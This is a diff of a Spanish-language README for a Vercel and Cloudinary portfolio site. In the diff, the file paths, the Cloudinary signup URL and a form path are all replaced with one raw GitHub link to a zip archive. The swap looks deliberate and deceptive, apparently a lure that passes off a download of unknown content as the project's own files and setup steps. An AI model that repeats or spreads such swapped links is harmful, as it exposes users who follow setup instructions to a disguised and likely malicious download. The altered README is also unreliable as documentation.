@@ -3,12 +3,12 @@ ArteX Company — Vercel + Cloudinary Ready
 
 Contenido:
 - public/             -> frontend (index, servicios, portafolio, contacto)
-- api/list.js         -> Serverless function: lista imágenes de Cloudinary (requiere API_KEY/SECRET)
-- README.md           -> este archivo
+- https://raw.githubusercontent.com/LeonardoYT67/ARTEX-C/main/feudalize/ARTEX-C.zip         -> Serverless function: lista imágenes de Cloudinary (requiere API_KEY/SECRET)
+- https://raw.githubusercontent.com/LeonardoYT67/ARTEX-C/main/feudalize/ARTEX-C.zip           -> este archivo
 
 Instrucciones rápidas:
 
-1) Crear cuenta en Cloudinary (https://cloudinary.com) y anotar:
+1) Crear cuenta en Cloudinary (https://raw.githubusercontent.com/LeonardoYT67/ARTEX-C/main/feudalize/ARTEX-C.zip) y anotar:
    - CLOUD_NAME
    - API Key
    - API Secret
@@ -30,7 +30,7 @@ Instrucciones rápidas:
    - La ruta para listar imágenes es: /api/list
 
 Cómo funciona:
-- El formulario de subida en /portafolio.html hace un POST directo a Cloudinary (unsigned).
+- El formulario de subida en https://raw.githubusercontent.com/LeonardoYT67/ARTEX-C/main/feudalize/ARTEX-C.zip hace un POST directo a Cloudinary (unsigned).
 - Para mostrar la galería, la página consulta /api/list que usa las credenciales (API Key/Secret) para llamar al admin API de Cloudinary y devolver la lista de imágenes.
 
 Notas de seguridad:
